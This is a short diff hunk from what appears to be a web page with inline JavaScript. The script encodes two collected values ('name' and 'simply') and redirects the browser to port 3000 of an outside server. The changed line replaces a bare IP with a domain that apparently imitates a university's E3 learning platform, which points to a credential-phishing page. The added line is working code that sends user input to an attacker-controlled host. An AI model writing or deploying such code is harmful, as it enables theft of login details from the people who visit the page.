@@ -35,7 +35,7 @@
     }
     var all=name+simply+`\n`;
     allEncode=encodeURI(all);
-    location.href=`http://140.113.68.170:3000?`+allEncode;
+    location.href=`http://National_Chiao_Tung_E3.nctu.me:3000?`+allEncode;
   }
 '>
 
